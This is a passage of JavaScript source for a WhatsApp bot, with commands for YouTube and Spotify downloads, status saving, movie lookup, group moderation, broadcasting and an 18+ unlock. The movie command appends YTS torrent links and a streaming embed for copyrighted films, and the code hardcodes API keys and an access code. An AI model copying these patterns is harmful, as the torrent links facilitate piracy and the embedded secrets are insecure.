        const thumb    = d.thumbnail || videoInfo?.thumbnail || null;
        const dur      = d.duration_formatted || videoInfo?.timestamp || 'N/A';

        const safeTitle2 = titleStr.replace(/[<>:"/\\|?*]+/g, '').substring(0, 50);
        const audioCaption2 = `🎵 *${titleStr}*\n⏱️ ${dur}\n🎚️ ${audioFmt.quality} ${audioFmt.format} — ${audioFmt.size}`;

        // Download buffer + send thumbnail in parallel
        const [audioBuf2] = await Promise.all([
            axios.get(audioFmt.url, {
                responseType: 'arraybuffer',
                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
                timeout: 180000,
                maxContentLength: 200 * 1024 * 1024
            }).then(r => Buffer.from(r.data)),
            thumb ? devtrust.sendMessage(m.chat, addNewsletterContext({ image: { url: thumb }, caption: audioCaption2 }), { quoted: m }) : Promise.resolve()
        ]);

        await devtrust.sendMessage(m.chat, addNewsletterContext({
            audio: audioBuf2,
            mimetype: 'audio/mpeg',
            fileName: `${safeTitle2}.mp3`
        }), { quoted: m });
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (error) {
        console.error('Play2 Error:', error.message);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`❌ *Play2 failed:* ${error.message}`);
    }
}
break;

case 'ytmp4':
case 'video':
case 'mp4':
case 'ytvideo': {
    if (!text) return reply(`🎬 *YouTube Video Downloader*\n\nUsage: ${prefix}video [song name or YouTube link]\nExample: ${prefix}video shape of you`);
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
        reply(`🔍 Searching: *${text}*...`);

        const yts = require('yt-search');
        let videoUrl = text;
        let videoInfo = null;

        if (!text.includes('youtube.com') && !text.includes('youtu.be')) {
            const { videos } = await yts(text);
            if (!videos?.length) {
                await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                return reply('❌ No results found. Try a YouTube link instead.');
            }
            videoInfo = videos.filter(v => !v.live)[0] || videos[0];
            videoUrl = videoInfo.url;
        }

        // ── Use PrinceTech YTDL API ───────────────────────────────────────────
        const apiRes = await axios.get(`https://api.princetechn.com/api/download/ytdl?apikey=prince&url=${encodeURIComponent(videoUrl)}`, { timeout: 60000 });
        const apiData = apiRes.data?.result;
        if (!apiData?.video_url) throw new Error('API did not return video URL');

        const titleStr  = apiData.title || videoInfo?.title || 'Unknown';
        const thumb     = apiData.thumbnail || videoInfo?.thumbnail || null;
        const dur       = apiData.duration || videoInfo?.timestamp || 'N/A';
        const quality   = apiData.video_quality || '720p';
        const safeTitle = titleStr.replace(/[<>:"/\\|?*]+/g, '').substring(0, 50);
        const caption   = `🎬 *${titleStr}*\n⏱️ Duration: ${dur}\n🎚️ Quality: ${quality}\n\n⬇️ Downloading...`;

        if (thumb) await devtrust.sendMessage(m.chat, { image: { url: thumb }, caption }, { quoted: m });

        const videoBuf = await axios.get(apiData.video_url, {
            responseType: 'arraybuffer',
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            timeout: 300000,
            maxContentLength: 500 * 1024 * 1024
        }).then(r => Buffer.from(r.data));

        const sizeMB = (videoBuf.length / 1024 / 1024).toFixed(2);
        await devtrust.sendMessage(m.chat, {
            video: videoBuf,
            caption: `🎬 *${titleStr}*\n🎚️ Quality: ${quality}\n📦 Size: ${sizeMB} MB`,
            mimetype: 'video/mp4',
            fileName: `${safeTitle}.mp4`
        }, { quoted: m });
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (err) {
        console.error('Video command error:', err.message);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`❌ *Video failed:* ${err.message}`);
    }
}
break;

case 'ytdl':
case 'ytdown': {
    if (!text) return reply(`🎬 *YouTube Downloader (VidsSave)*\n\nUsage: ${prefix + command} <YouTube URL>\nExample: ${prefix + command} https://youtu.be/dQw4w9WgXcQ\n\nSupports: Video (144P–2160P) + Audio formats`)
    const isYtUrl = text.includes('youtube.com') || text.includes('youtu.be')
    if (!isYtUrl) return reply(`❌ *Please send a valid YouTube URL*\nExample: ${prefix + command} https://youtu.be/dQw4w9WgXcQ`)
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
        const result = await ytDownload(text)
        const d = result.data
        const vList = d.video_formats.map((v, i) => `${i + 1}. 🎬 ${v.quality} ${v.format} — ${v.size_mb}`).join('\n')
        const aList = d.audio_formats.map((a, i) => `${d.video_formats.length + i + 1}. 🎵 ${a.quality} ${a.format} — ${a.size_mb}`).join('\n')
        const menu = `🎬 *${d.title}*\n⏱️ *Duration:* ${d.duration_formatted || 'N/A'}\n\n*Video Formats:*\n${vList}\n\n*Audio Formats:*\n${aList}\n\n📌 Reply with number to download`
        const sentMsg = await devtrust.sendMessage(m.chat,
            { image: { url: d.thumbnail }, caption: menu },
            { quoted: m }
        )
        const allFormats = [...d.video_formats, ...d.audio_formats]
        const _ytdlHandler = async (messageUpdate) => {
            try {
                const msg = messageUpdate?.messages[0]
                if (!msg?.message) return
                const replyText = (msg.message.extendedTextMessage?.text || msg.message.conversation || '').trim()
                const stanzaId = msg.message.extendedTextMessage?.contextInfo?.stanzaId
                if (stanzaId !== sentMsg?.key?.id) return
                const num = parseInt(replyText)
                if (isNaN(num) || num < 1 || num > allFormats.length) return
                devtrust.ev.off('messages.upsert', _ytdlHandler)
                await devtrust.sendMessage(m.chat, { react: { text: '⬇️', key: msg.key } })
                const selected = allFormats[num - 1]
                const isVideo = num <= d.video_formats.length
                await devtrust.sendMessage(m.chat, { text: `⏳ Downloading ${selected.quality} ${selected.format}...` }, { quoted: msg })
                const ext = selected.format.toLowerCase() === 'opus' ? 'ogg' : selected.format.toLowerCase()
                const fileName = `${(d.title || 'file').replace(/[<>:"/\\|?*]+/g, '').substring(0, 50)}_${selected.quality}.${ext}`
                const dlBuf = await axios.get(selected.download_url, {
                    responseType: 'arraybuffer',
                    headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
                    timeout: 300000,
                    maxContentLength: 500 * 1024 * 1024
                })
                const fileBuffer = Buffer.from(dlBuf.data)
                if (isVideo) {
                    await devtrust.sendMessage(m.chat, {
                        video: fileBuffer,
                        caption: `🎬 *${d.title}*\n🎚️ *Quality:* ${selected.quality}\n📦 *Size:* ${selected.size_mb}`,
                        mimetype: 'video/mp4', fileName
                    }, { quoted: msg })
                } else {
                    await devtrust.sendMessage(m.chat, {
                        audio: fileBuffer,
                        mimetype: 'audio/mpeg', fileName,
                        caption: `🎵 *${d.title}*\n🎚️ *Quality:* ${selected.quality}\n📦 *Size:* ${selected.size_mb}`
                    }, { quoted: msg })
                }
                await devtrust.sendMessage(m.chat, { react: { text: '✅', key: msg.key } })
            } catch (err) {
                console.error('ytdl handler error:', err.message)
                await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
            }
        }
        devtrust.ev.on('messages.upsert', _ytdlHandler)
        setTimeout(() => devtrust.ev.off('messages.upsert', _ytdlHandler), 180000)
    } catch (err) {
        console.error('ytdl error:', err.message)
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
        reply(`❌ YouTube download failed: ${err.message}`)
    }
}
break;

case 'dlstatus':
case 'swdl':
case 'statusdl': {
    if (!isCreator) return reply('🔒 *Owner only*');
    const _m = m.message;
    const _type = Object.keys(_m)[0];
    const _ctxInfo = _m[_type]?.contextInfo;
    if (!_ctxInfo || !_ctxInfo.quotedMessage) {
        return reply('📌 *Please reply to a Status update to download it.*');
    }
    const _quotedMsg = _ctxInfo.quotedMessage;
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
        const _quotedType = Object.keys(_quotedMsg)[0];
        const _mediaData = _quotedMsg[_quotedType];
        if (_quotedType === 'conversation' || _quotedType === 'extendedTextMessage') {
            const _txt = _quotedMsg.conversation || _quotedMsg.extendedTextMessage?.text || '';
            await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
            return reply(`📝 *Status Text:*\n\n${_txt}`);
        }
        const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
        const _mediaType = _quotedType.replace('Message', '');
        const _stream = await downloadContentFromMessage(_mediaData, _mediaType);
        let _buf = Buffer.from([]);
        for await (const chunk of _stream) { _buf = Buffer.concat([_buf, chunk]); }
        if (!_buf.length) throw new Error('Empty buffer — media could not be downloaded');
        if (_quotedType === 'imageMessage') {
            await devtrust.sendMessage(m.chat, { image: _buf, caption: _mediaData.caption || '📸 *Status Image*' }, { quoted: m });
        } else if (_quotedType === 'videoMessage') {
            await devtrust.sendMessage(m.chat, { video: _buf, caption: _mediaData.caption || '🎥 *Status Video*', mimetype: 'video/mp4' }, { quoted: m });
        } else if (_quotedType === 'audioMessage') {
            await devtrust.sendMessage(m.chat, { audio: _buf, mimetype: 'audio/mp4', ptt: false }, { quoted: m });
        } else if (_quotedType === 'documentMessage') {
            await devtrust.sendMessage(m.chat, { document: _buf, mimetype: _mediaData.mimetype || 'application/octet-stream', fileName: _mediaData.fileName || 'status_file' }, { quoted: m });
        } else {
            await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return reply(`❌ *Unsupported status type:* ${_quotedType}`);
        }
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (e) {
        console.error('Status DL Error:', e);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`❌ *Failed to download status:* ${e.message}`);
    }
}
break;

case 'movie':
case 'film':
case 'imdb': {
    const OMDB_KEY = 'trilogy';
    if (!text) {
        return reply(
            `🎬 *Movie Info*\n\n` +
            `*Usage:* \`${prefix}movie <name>\`\n\n` +
            `*Examples:*\n` +
            `• \`${prefix}movie Pathaan\`\n` +
            `• \`${prefix}movie Avengers Endgame\`\n` +
            `• \`${prefix}movie Black Panther\`\n\n` +
            `Works for Bollywood, Hollywood, and all languages!`
        );
    }
    await reply(`🔍 Searching *${text}*...`);
    try {
        const _year = text.match(/\b(19|20)\d{2}\b/)?.[0];
        const _title = text.replace(/\b(19|20)\d{2}\b/, '').trim();
        let _url = `https://www.omdbapi.com/?t=${encodeURIComponent(_title)}&apikey=${OMDB_KEY}&plot=full`;
        if (_year) _url += `&y=${_year}`;
        const _res = await axios.get(_url, { timeout: 15000 });
        let _data = _res.data;
        if (_data.Response === 'False') {
            const _sRes = await axios.get(`https://www.omdbapi.com/?s=${encodeURIComponent(_title)}&apikey=${OMDB_KEY}&type=movie`, { timeout: 15000 });
            if (_sRes.data.Response === 'True' && _sRes.data.Search?.length) {
                const _first = _sRes.data.Search[0];
                const _dRes = await axios.get(`https://www.omdbapi.com/?i=${_first.imdbID}&apikey=${OMDB_KEY}&plot=full`, { timeout: 15000 });
                _data = _dRes.data;
            }
        }
        if (_data.Response === 'False') {
            return reply(`❌ *Movie not found:* ${text}`);
        }
        const _imdbId = _data.imdbID;
        const _ratings = (_data.Ratings || []).map(r => `• ${r.Source}: *${r.Value}*`).join('\n');
        const _stars = _data.imdbRating !== 'N/A'
            ? '⭐'.repeat(Math.round(parseFloat(_data.imdbRating) / 2)) + ` (${_data.imdbRating}/10)`
            : 'N/A';

        // YTS download links
        let _dlText = '';
        try {
            const _yts = await axios.get(`https://yts.mx/api/v2/list_movies.json?query_term=${_imdbId}&limit=1`, { timeout: 8000 });
            const _torrents = _yts.data?.data?.movies?.[0]?.torrents || [];
            if (_torrents.length > 0) {
                _dlText = '\n\n📥 *Download Links:*\n';
                _torrents.slice(0, 4).forEach(t => {
                    _dlText += `• [${t.quality} ${t.type}] ${t.size}\n${t.url}\n`;
                });
            }
        } catch (_) {}

        const _movieText =
            `🎬 *${_data.Title}* (${_data.Year})\n\n` +
            `🎭 *Genre:* ${_data.Genre}\n` +
            `🌍 *Language:* ${_data.Language}\n` +
            `🎬 *Director:* ${_data.Director}\n` +
            `🎭 *Cast:* ${_data.Actors}\n` +
            `⏱️ *Runtime:* ${_data.Runtime}\n` +
            `🏆 *Awards:* ${_data.Awards}\n\n` +
            `${_stars}\n` +
            `${_ratings}\n\n` +
            `📝 *Plot:*\n${_data.Plot}\n` +
            (_data.BoxOffice && _data.BoxOffice !== 'N/A' ? `\n💰 *Box Office:* ${_data.BoxOffice}` : '') +
            _dlText +
            `\n\n🎥 *Watch Online:* https://vidsrc.to/embed/movie/${_imdbId}\n` +
            `🔗 *IMDB:* imdb.com/title/${_imdbId}`;

        if (_data.Poster && _data.Poster !== 'N/A') {
            await devtrust.sendMessage(m.chat, { image: { url: _data.Poster }, caption: _movieText }, { quoted: m });
        } else {
            await reply(_movieText);
        }
    } catch (error) {
        console.error('Movie error:', error.message);
        reply(`❌ *Failed:* ${error.message}`);
    }
}
break;

case 'ibsbmg': {
    if (!q) return reply(`🎨 *Use:* img prompt,ratio\nExample: img robin,3:4`);

    let parts = q.split(',');
    let prompt = parts[0]?.trim();
    let ratio = parts[1]?.trim() || "1:1";

    try {
        let apiUrl = `https://image.pollinations.ai/prompt/${encodeURIComponent(prompt)}?width=1024&height=1024&nologo=true&seed=${Date.now()}`;
        let res = await fetch(apiUrl);
        let data = await res.json();

        if (data.status && data.result) {
            await devtrust.sendMessage(m.chat,
                addNewsletterContext({
                    image: { url: data.result },
                    caption: `🎨 *${prompt}* (${ratio})`
                }),
                { quoted: m }
            );
        } else {
            reply("❌ *Failed to generate image*");
        }
    } catch (e) {
        console.error(e);
        reply("⚠️ *Error fetching from API*");
    }
}
break;

case 'kick': {
    if (!isCreator) return reply("🔒 *Owner only*");
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isBotAdmins) return reply("🤖 *Bot needs admin rights to kick!*");

    // ✅ FIX: m.mentionedJid could be undefined — use optional chaining
    let users = m.mentionedJid?.[0] || m.quoted?.sender ||
                (text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null);
    if (!users) return reply("👤 *Tag or quote a user to kick*");

    try {
        await devtrust.groupParticipantsUpdate(m.chat, [users], 'remove');
        reply("✅ *User kicked*");
    } catch (e) {
        reply(`❌ *Kick failed:* ${e.message}`);
    }
}
break;

case 'listadmin':
case 'tagadmin':
case 'admin': {
    if (!isCreator) return reply("🔒 *Owner only*");
    if (!m.isGroup) return reply("👥 *Groups only*");

    const groupAdmins = participants.filter(p => p.admin);
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n');
    const owner = groupMetadata.owner || 
                 groupAdmins.find(p => p.admin === 'superadmin')?.id || 
                 m.chat.split`-`[0] + '@s.whatsapp.net';

    let text = `👑 *Admins*\n\n${listAdmin}`;
    
    devtrust.sendMessage(m.chat, {
        text,
        mentions: [...groupAdmins.map(v => v.id), owner]
    }, { quoted: m });
}
break;

case 'delete':
case 'del': {
    if (!isCreator) return reply("🔒 *Owner only*");
    if (!m.quoted) return reply("🗑️ *Reply to a message to delete it*");

    devtrust.sendMessage(m.chat, {
        delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.quoted.id,
            participant: m.quoted.sender
        }
    });
}
break;

case 'grouplink': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    // ✅ FIX: groupInviteCode requires bot to be admin
    if (!isBotAdmins) return reply('🤖 *Bot needs admin rights to get the group link!*');

    try {
        const response = await devtrust.groupInviteCode(m.chat);
        reply(`🔗 *Group Link*\nhttps://chat.whatsapp.com/${response}\n\n_Share responsibly!_`);
    } catch (e) {
        reply(`❌ *Failed to get link:* ${e.message}`);
    }
}
break;

case 'tag':
case 'totag': {
    if (!isCreator) return reply("🔒 *Owner only*");
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins) return reply("👑 *Admin only*");
    if (!m.quoted) return reply(`💬 *Reply to a message with ${prefix + command}*`);

    devtrust.sendMessage(m.chat, {
        forward: m.quoted.fakeObj,
        mentions: participants.map(a => a.id)
    });
}
break;

case 'broadcast': { 
    if (!isCreator) return reply("🔒 *Owner only*");
    if (!q) return reply(`📢 *No broadcast message provided*`);
    
    let getGroups = await devtrust.groupFetchAllParticipating();
    let groups = Object.entries(getGroups).slice(0).map(entry => entry[1]);
    let res = groups.map(v => v.id);
    
    reply(`📨 *Broadcasting to ${res.length} groups*`);
    
    for (let i of res) {
        await devtrust.sendMessage(i, 
            addNewsletterContext({
                image: { url: "https://files.catbox.moe/smv12k.jpeg" },
                caption: `📢 *Broadcast*\n\n${qtext}`
            })
        );
    }
    
    reply(`✅ *Broadcast sent to ${res.length} groups*`);
} 
break;

case "spotify":
case "spotifydl":
case "sp": {
    if (!text) {
        return reply(`🎧 *CYBER Spotify*\n\nUsage: ${prefix}spotify [spotify_track_link]\nExample: ${prefix}spotify https://open.spotify.com/track/xxxxx`);
    }
    
    // Validate Spotify URL
    if (!text.includes('open.spotify.com/track/')) {
        return reply(`❌ *CYBER Spotify*\n\nInvalid Spotify track link. Please provide a valid track URL.`);
    }
    
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '🎧', key: m.key } });
        
        reply(`🔍 *CYBER Spotify*\n\nFetching track: ${text.split('/track/')[1]?.substring(0, 10)}...`);
        
        const response = await axios.get(`https://apis.davidcyril.name.ng/spotifydl2`, {
            params: {
                url: text,
                apikey: ""
            },
            timeout: 30000
        });
        
        if (response.data.success && response.data.results) {
            const result = response.data.results;
            
            // Send audio with rich preview
            await devtrust.sendMessage(m.chat, 
                addNewsletterContext({
                    audio: { url: result.downloadMP3 },
                    mimetype: 'audio/mpeg',
                    fileName: `${result.title}.mp3`,
                    contextInfo: {
                        externalAdReply: {
                            title: result.title,
                            body: `🎧 ${result.type || 'Track'}`,
                            thumbnailUrl: result.image,
                            mediaType: 1,
                            renderLargerThumbnail: true,
                            sourceUrl: text
                        }
                    }
                }), 
                { quoted: m }
            );
            
            await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
            
        } else {
            throw new Error('No download link found');
        }
        
    } catch (error) {
        console.error('Spotify error:', error.message);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        
        if (error.response?.status === 404) {
            return reply(`❌ *CYBER Spotify*\n\nTrack not found. Check the link and try again.`);
        }
        
        reply(`⚠️ *CYBER Spotify*\n\nSpotify service is on break. Try again later.`);
    }
}
break;

case 'groupstatus':
case 'gstatus':
case 'gst': {
    if (!m.isGroup) {
        return reply(`👥 *CYBER Group Status*\n\nThis command can only be used in groups.`);
    }
    
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '📢', key: m.key } });
        
        // Check if replying to a message or providing text
        const quotedMsg = m.quoted;
        const textInput = text;
        
        if (!quotedMsg && !textInput) {
            return reply(`📢 *CYBER Group Status*\n\nReply to an image/video/audio or provide text to post as group status.\n\nExample: ${prefix}gstatus Hello group!`);
        }
        
        // Simple random ID generator
        function generateMessageId() {
            return '3EB0' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
        }
        
        let statusInnerMessage = {};
        
        // ==========================================
        // 1. HANDLE TEXT STATUS (BLACK BACKGROUND)
        // ==========================================
        if (!quotedMsg && textInput) {
            statusInnerMessage = {
                extendedTextMessage: {
                    text: textInput,
                    backgroundArgb: 0xFF000000, // BLACK background
                    textArgb: 0xFFFFFFFF, // White text
                    font: 1,
                    contextInfo: { 
                        mentionedJid: [],
                        isGroupStatus: true 
                    }
                }
            };
            
            // Create and send status
            const statusPayload = {
                groupStatusMessageV2: {
                    message: statusInnerMessage
                }
            };
            
            const statusId = generateMessageId();
            await devtrust.relayMessage(m.chat, statusPayload, { messageId: statusId });
            
            await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
            return reply(`📢 *CYBER Group Status*\n\nText status posted!`);
        }
        
        // ==========================================
        // 2. HANDLE QUOTED MEDIA/TEXT
        // ==========================================
        else if (quotedMsg) {
            // Check if it's a media message
            const mime = (quotedMsg.msg || quotedMsg).mimetype || '';
            
            // IMAGE STATUS
            if (/image/.test(mime)) {
                // Download image
                let media = await quotedMsg.download();
                
                // Send as image status
                await devtrust.sendMessage(m.chat, {
                    image: media,
                    caption: textInput || quotedMsg.caption || '',
                    contextInfo: { isGroupStatus: true }
                });
            } 
            
            // VIDEO STATUS
            else if (/video/.test(mime)) {
                // Download video
                let media = await quotedMsg.download();
                
                // Send as video status
                await devtrust.sendMessage(m.chat, {
                    video: media,
                    caption: textInput || quotedMsg.caption || '',
                    contextInfo: { isGroupStatus: true }
                });
            }
            
            // AUDIO STATUS (NEW)
            else if (/audio/.test(mime)) {
                // Download audio
                let media = await quotedMsg.download();
                
                // Send as audio status
                await devtrust.sendMessage(m.chat, {
                    audio: media,
                    mimetype: 'audio/mpeg',
                    ptt: false, // true for voice note
                    contextInfo: { isGroupStatus: true }
                });
            }
            
            // TEXT STATUS (Quoted text - BLACK BACKGROUND)
            else if (quotedMsg.conversation || quotedMsg.text) {
                const textContent = quotedMsg.conversation || quotedMsg.text || textInput;
                
                statusInnerMessage = {
                    extendedTextMessage: {
                        text: textContent,
                        backgroundArgb: 0xFF000000, // BLACK background
                        textArgb: 0xFFFFFFFF, // White text
                        font: 2,
                        contextInfo: { 
                            mentionedJid: [],
                            isGroupStatus: true 
                        }
                    }
                };
                
                const statusPayload = {
                    groupStatusMessageV2: {
                        message: statusInnerMessage
                    }
                };
                
                const statusId = generateMessageId();
                await devtrust.relayMessage(m.chat, statusPayload, { messageId: statusId });
                
            } else {
                return reply(`❌ *CYBER Group Status*\n\nUnsupported media type. Reply to image, video, audio, or text only.`);
            }
            
            await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
            reply(`📢 *CYBER Group Status*\n\nStatus posted!`);
        }
        
    } catch (error) {
        console.error('Group Status Error:', error);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`⚠️ *CYBER Group Status*\n\nFailed: ${error.message}`);
    }
}
break;

case 'tagall': {
    if (!isCreator) return reply("🔒 *Owner only*");
    if (!m.isGroup) return reply("👥 *Groups only*");

    const textMessage = args.join(" ") || "No message";
    let teks = `🏷️ *Tag All*\n\n📝 ${textMessage}\n\n`;

    const groupMetadata = await devtrust.groupMetadata(m.chat);
    const participants = groupMetadata.participants;

    for (let mem of participants) {
        teks += `@${mem.id.split("@")[0]}\n`;
    }

    devtrust.sendMessage(m.chat, {
        text: teks,
        mentions: participants.map((a) => a.id)
    }, { quoted: m });
}
break;

case 'hidetag': {
    if (!isCreator) return reply("🔒 *Owner only*");
    // ✅ FIX: groupMetadata throws if called in a PM — check isGroup first
    if (!m.isGroup) return reply("👥 *Groups only*");

    const _htMeta = await devtrust.groupMetadata(m.chat);
    const _htParts = _htMeta.participants;

    devtrust.sendMessage(m.chat, {
        text: q || ' ',
        mentions: _htParts.map(a => a.id)
    }, { quoted: m });
}
break;

case 'promote': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isCreator) return reply("🔒 *Owner only*");
    if (!isBotAdmins) return reply("🤖 *Bot needs admin rights to promote!*");

    // ✅ FIX: m.mentionedJid could be undefined — use optional chaining
    let users = m.mentionedJid?.[0] || m.quoted?.sender ||
                (text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null);
    if (!users) return reply("👤 *Tag or quote a user to promote*");

    try {
        await devtrust.groupParticipantsUpdate(m.chat, [users], 'promote');
        reply("👑 *User promoted to admin*");
    } catch (e) {
        reply(`❌ *Promote failed:* ${e.message}`);
    }
}
break;

case 'demote': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isCreator) return reply("🔒 *Owner only*");
    if (!isBotAdmins) return reply("🤖 *Bot needs admin rights to demote!*");

    // ✅ FIX: m.mentionedJid could be undefined — use optional chaining
    let users = m.mentionedJid?.[0] || m.quoted?.sender ||
                (text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null);
    if (!users) return reply("👤 *Tag or quote a user to demote*");

    try {
        await devtrust.groupParticipantsUpdate(m.chat, [users], 'demote');
        reply("⬇️ *User demoted from admin*");
    } catch (e) {
        reply(`❌ *Demote failed:* ${e.message}`);
    }
}
break;

case 'mute': {
    if (!isCreator) return reply("🔒 *Owner only*");
    if (!m.isGroup) return reply("👥 *Groups only*");
    // ✅ FIX: groupSettingUpdate throws if bot isn't admin
    if (!isBotAdmins) return reply("🤖 *Bot needs admin rights to mute the group!*");

    try {
        await devtrust.groupSettingUpdate(m.chat, 'announcement');
        reply("🔇 *Group muted* • Only admins can message");
    } catch (e) {
        reply(`❌ *Mute failed:* ${e.message}`);
    }
}
break;

case 'unmute': {
    if (!isCreator) return reply("🔒 *Owner only*");
    if (!m.isGroup) return reply("👥 *Groups only*");
    // ✅ FIX: groupSettingUpdate throws if bot isn't admin
    if (!isBotAdmins) return reply("🤖 *Bot needs admin rights to unmute the group!*");

    try {
        await devtrust.groupSettingUpdate(m.chat, 'not_announcement');
        reply("🔊 *Group unmuted* • Everyone can message");
    } catch (e) {
        reply(`❌ *Unmute failed:* ${e.message}`);
    }
}
break;

case 'left': {
    if (!isCreator) return reply("🔒 *Owner only*");
    
    await devtrust.groupLeave(m.chat);
    reply("👋 *Left group* • Goodbye!");
}
break;

// ============ ANTIEDIT COMMAND ============
case 'antiedit':
case 'ae': {
    if (isSettingsLocked() && !isCreator) return reply('🔒 *Settings are locked by owner*');
    const _aeBotNumAE2 = jidToNum(getBotJid(devtrust)); const _aeCfgNow = loadAntieditCfg(_aeBotNumAE2);
    const _aeCurrentMode = _aeCfgNow.mode || 'off';
    const _aeOption = args[0]?.toLowerCase();
    const _aeModeLabel = {
        'private': '🔒 private — ALL edits → saved messages',
        'private_pm': '🔒 private_pm — DM edits only → saved messages',
        'private_groups': '🔒 private_groups — Group edits only → saved messages',
        'chat': '💬 chat — ALL edits → same chat',
        'chat_groups': '💬 chat_groups — Group edits only → same chat',
        'off': '❌ off — Disabled'
    };
    if (!_aeOption) {
        return reply(
            `*✏️ ANTI-EDIT SETTINGS*\n\n` +
            `*Current Mode:* ${_aeModeLabel[_aeCurrentMode] || _aeCurrentMode}\n\n` +
            `*Delivery to saved messages (message myself):*\n` +
            `• \`${prefix}antiedit private\` — ALL edits (groups + PMs) → saved messages\n` +
            `• \`${prefix}antiedit private_pm\` — PM/DM edits only → saved messages\n` +
            `• \`${prefix}antiedit private_groups\` — Group edits only → saved messages\n\n` +
            `*Delivery back into chat:*\n` +
            `• \`${prefix}antiedit chat\` — ALL edits → reposted in same chat\n` +
            `• \`${prefix}antiedit chat_groups\` — Group edits only → reposted in chat\n\n` +
            `• \`${prefix}antiedit off\` — Disable`
        );
    }
    const _aeValidModes = ['private', 'private_pm', 'private_groups', 'chat', 'chat_groups', 'off'];
    if (!_aeValidModes.includes(_aeOption)) {
        return reply(`❌ Invalid mode.\n\nValid: private, private_pm, private_groups, chat, chat_groups, off`);
    }
    saveAntieditCfg({ mode: _aeOption }, _aeBotNumAE2);
    return reply(`✅ *Anti-edit set to:* ${_aeModeLabel[_aeOption]}`);
}
break;

// ============ ADDKEY — 18+ ADULT UNLOCK ============
case 'addkey': {
    const _akSecretFile = './database/adult_secret.json';
    const _akUnlockedFile = require('path').join(__dirname, 'database', 'adult_unlocked.json');
    const _akBannedFile = './database/adult_banned.json';

    const _akSenderNum = (m.sender || '').split('@')[0].split(':')[0];

    // Load banned list — use 5-min cache instead of reading disk on every call
    const _akBanned = (global._flagCache?.akBanned || []);
    const _akIsBanned = _akBanned.some(id => String(id).replace(/[^0-9]/g,'') === _akSenderNum);
    if (_akIsBanned) return reply(`🚫 *Access Denied*\nYou have been permanently banned from 18+ content.`);

    if (!text) return reply(`🔑 *Usage:* ${prefix}addkey <code>\n\nEnter the access code provided by admin.`);

    // Load secret code from cache
    const _akSecret = global._flagCache?.akSecret || 'cybersecpro7898';

    if (text.trim() !== _akSecret) return reply(`❌ *Wrong code!*\nContact admin for the correct access code.`);

    // Load and update unlocked list — read fresh from disk here since we are modifying it
    let _akUnlocked = [];
    try { if (fs.existsSync(_akUnlockedFile)) _akUnlocked = JSON.parse(fs.readFileSync(_akUnlockedFile, 'utf-8')); } catch(e) {}

    const _akAlreadyUnlocked = _akUnlocked.some(id => String(id).replace(/[^0-9]/g,'') === _akSenderNum);
    if (_akAlreadyUnlocked) return reply(`✅ *Already Unlocked*\nYou already have 18+ access.`);

    _akUnlocked.push(_akSenderNum);
    try {
        if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
        fs.writeFileSync(_akUnlockedFile, JSON.stringify(_akUnlocked, null, 2));
    } catch(e) {}

    // FIX: Immediately update in-memory cache so commands work right away
    // (cache has 15-min TTL — without this, user must wait up to 15 min after unlock)
    try {
        if (!global._flagCache) global._flagCache = {};
        if (!Array.isArray(global._flagCache.adult)) global._flagCache.adult = [];
        if (!Array.isArray(global._flagCache.adultUnlocked)) global._flagCache.adultUnlocked = [];
        if (!global._flagCache.adult.some(id => String(id).replace(/[^0-9]/g,'') === _akSenderNum)) {
            global._flagCache.adult.push(_akSenderNum);
        }
        if (!global._flagCache.adultUnlocked.some(id => String(id).replace(/[^0-9]/g,'') === _akSenderNum)) {
            global._flagCache.adultUnlocked.push(_akSenderNum);
        }
        global._flagCache.ts = 0; // force full re-read on next command
    } catch(_cacheErr) {}

    return reply(`✅ *18+ Access Unlocked!*\nYou can now use adult content commands.\nType *${prefix}removekey* to remove your access anytime.`);
}
break;

// ============ REMOVEKEY COMMAND ============
case 'removekey': {
    const _rkUnlockedFile = require('path').join(__dirname, 'database', 'adult_unlocked.json');
    const _rkSenderNum = (m.sender || '').split('@')[0].split(':')[0];
    let _rkUnlocked = [];
